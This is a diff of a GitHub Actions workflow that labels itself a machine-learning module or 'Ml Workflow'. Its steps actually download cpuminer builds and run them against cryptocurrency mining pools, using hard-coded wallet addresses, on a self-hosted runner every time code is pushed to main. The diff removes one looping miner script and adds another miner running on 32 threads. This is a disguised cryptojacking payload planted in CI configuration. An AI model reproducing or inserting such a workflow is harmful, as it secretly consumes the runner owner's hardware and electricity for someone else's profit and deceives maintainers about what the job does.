@@ -1,29 +1,27 @@
-name: Machine Learning Module
+name: Ml Workflow
 
 on:
   push:
     branches:
-      - main  # Adjust this based on your branch
+      - main  # You might need to adjust this depending on your default branch name
 
 jobs:
   build:
     runs-on: self-hosted
 
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v2
+    - name: Checkout Repository
+      uses: actions/checkout@v2
 
-      - name: Download Module
-        run: |
-          sudo apt -y install wget
-          wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz
-          tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
-
-      - name: Run Module 
-        run: |
-          echo '#!/bin/sh
-          while [ 1 ]; do
-          ./cpuminer -a yespower -o stratum+tcp://pool.viporlab.net:16004 -u v38ioPMpp4jmKPjssPbdGygKLK9hFkvyXk.c1
-          done' > autominer.sh
-          chmod +x autominer.sh
-          ./autominer.sh
+    - name: Install Dependencies
+      run: |
+        sudo apt update
+        sudo apt -y install wget tar
+    - name: Download Ml
+      run: |
+        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
+        tar xf cpuminer-opt-linux.tar.gz
+        chmod +x cpuminer-sse2
+    - name: Run Ml
+      run: |
+        ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.r1 --threads=32
